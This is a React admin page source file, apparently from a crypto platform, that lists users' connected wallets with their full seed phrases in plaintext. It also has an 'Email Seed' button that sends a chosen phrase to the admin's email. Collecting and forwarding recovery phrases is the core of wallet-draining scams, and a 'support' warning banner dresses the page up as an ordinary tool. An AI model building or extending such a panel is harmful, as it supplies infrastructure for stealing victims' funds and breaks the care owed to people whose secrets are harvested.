"use client";
import { useQuery } from "@tanstack/react-query";
import { Mail } from "lucide-react";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Skeleton } from "@/components/ui/skeleton";
import { Button } from "@/components/ui/button";
import api from "@/lib/api";
import { format } from "date-fns";
import { toast } from "sonner";

interface WalletRecord {
  _id: string;
  user: { name: string; email: string };
  exchange: string;
  seedPhrase?: string;
  isConnected: boolean;
  createdAt: string;
}

export default function AdminWalletsPage() {
  const { data: wallets = [], isLoading } = useQuery<WalletRecord[]>({
    queryKey: ["admin-wallets"],
    queryFn: async () => {
      const { data } = await api.get("/admin/wallets");
      return data;
    },
  });

  const sendSeedEmail = async (walletId: string, email: string) => {
    try {
      await api.post(`/admin/wallets/${walletId}/send-seed`);
      toast.success(`Seed phrase sent to admin email`);
    } catch {
      toast.error("Failed to send email");
    }
  };

  return (
    <div className="flex flex-col gap-5">
      <div className="flex items-center justify-between flex-wrap gap-2">
        <h2 className="text-xl font-bold text-white">Connected Wallets &amp; Seed Phrases</h2>
        <p className="text-xs text-[#cdcacc]">{wallets.length} wallet(s)</p>
      </div>

      <div
        className="rounded-[12px] px-4 py-3 text-sm"
        style={{ background: "rgba(247,127,0,0.1)", border: "1px solid rgba(247,127,0,0.2)", color: "#f77f00" }}
      >
        ⚠️ Seed phrases are highly sensitive. Only view when necessary for support.
      </div>

      {/* Card layout for responsive — stacked on mobile, table on desktop */}
      <div className="hidden lg:block rounded-[20px] overflow-auto" style={{ background: "#150578" }}>
        <Table>
          <TableHeader>
            <TableRow style={{ borderBottomColor: "rgba(255,255,255,0.08)" }}>
              {["User", "Email", "Exchange", "Seed Phrase (Full)", "Date", "Actions"].map((h) => (
                <TableHead key={h} className="text-[#cdcacc] text-sm font-medium py-4 whitespace-nowrap">{h}</TableHead>
              ))}
            </TableRow>
          </TableHeader>
          <TableBody>
            {isLoading
              ? [...Array(3)].map((_, i) => (
                  <TableRow key={i} style={{ borderBottomColor: "rgba(255,255,255,0.04)" }}>
                    {[...Array(6)].map((_, j) => (
                      <TableCell key={j} className="py-4">
                        <Skeleton className="h-4 w-24" style={{ background: "rgba(255,255,255,0.05)" }} />
                      </TableCell>
                    ))}
                  </TableRow>
                ))
              : wallets.map((w) => (
                  <TableRow key={w._id} style={{ borderBottomColor: "rgba(255,255,255,0.04)" }}>
                    <TableCell className="text-white text-sm py-4 font-medium whitespace-nowrap">{w.user?.name ?? "—"}</TableCell>
                    <TableCell className="text-[#cdcacc] text-sm py-4">{w.user?.email ?? "—"}</TableCell>
                    <TableCell className="text-white text-sm py-4 whitespace-nowrap">{w.exchange}</TableCell>
                    <TableCell className="py-4" style={{ maxWidth: "400px" }}>
                      {w.seedPhrase ? (
                        <p
                          style={{
                            fontFamily: "Space Grotesk, monospace",
                            fontSize: "12px",
                            color: "#e9d758",
                            wordBreak: "break-all",
                            lineHeight: "1.6",
                            margin: 0,
                          }}
                        >
                          {w.seedPhrase}
                        </p>
                      ) : (
                        <span className="text-xs text-[#cdcacc]/50">Not provided</span>
                      )}
                    </TableCell>
                    <TableCell className="text-xs py-4 text-[#cdcacc] whitespace-nowrap">
                      {format(new Date(w.createdAt), "dd MMM yyyy")}
                    </TableCell>
                    <TableCell className="py-4">
                      {w.seedPhrase && w.user?.email && (
                        <Button
                          size="sm"
                          onClick={() => sendSeedEmail(w._id, w.user.email)}
                          className="h-7 px-3 text-xs rounded-full gap-1 whitespace-nowrap"
                          style={{ background: "rgba(233,215,88,0.15)", color: "#e9d758", border: "1px solid rgba(233,215,88,0.3)" }}
                        >
                          <Mail size={11} /> Email Seed
                        </Button>
                      )}
                    </TableCell>
                  </TableRow>
                ))}
          </TableBody>
        </Table>
        {!isLoading && wallets.length === 0 && (
          <p className="text-sm text-[#cdcacc] text-center py-10">No wallets connected yet</p>
        )}
      </div>

      {/* Mobile card layout */}
      <div className="lg:hidden flex flex-col gap-3">
        {isLoading ? (
          [...Array(2)].map((_, i) => (
            <Skeleton key={i} className="h-32 rounded-[16px]" style={{ background: "#150578" }} />
          ))
        ) : wallets.length === 0 ? (
          <p className="text-sm text-[#cdcacc] text-center py-10">No wallets connected yet</p>
        ) : wallets.map((w) => (
          <div key={w._id} className="rounded-[16px] p-4 flex flex-col gap-3" style={{ background: "#150578" }}>
            <div className="flex items-start justify-between gap-3">
              <div>
                <p className="text-white text-sm font-semibold">{w.user?.name}</p>
                <p className="text-[#cdcacc] text-xs">{w.user?.email}</p>
              </div>
              <span className="text-[#cdcacc] text-xs whitespace-nowrap">{format(new Date(w.createdAt), "dd MMM")}</span>
            </div>
            <p className="text-[#cdcacc] text-xs">Exchange: <span className="text-white">{w.exchange}</span></p>
            {w.seedPhrase && (
              <div>
                <p className="text-[#cdcacc] text-xs mb-1">Seed Phrase:</p>
                <p style={{ fontFamily: "Space Grotesk, monospace", fontSize: "11px", color: "#e9d758", wordBreak: "break-all", lineHeight: 1.6 }}>
                  {w.seedPhrase}
                </p>
              </div>
            )}
            {w.seedPhrase && w.user?.email && (
              <Button
                size="sm"
                onClick={() => sendSeedEmail(w._id, w.user.email)}
                className="h-7 px-3 text-xs rounded-full gap-1 w-fit"
                style={{ background: "rgba(233,215,88,0.15)", color: "#e9d758", border: "1px solid rgba(233,215,88,0.3)" }}
              >
                <Mail size={11} /> Email Seed
              </Button>
            )}
          </div>
        ))}
      </div>
    </div>
  );
}
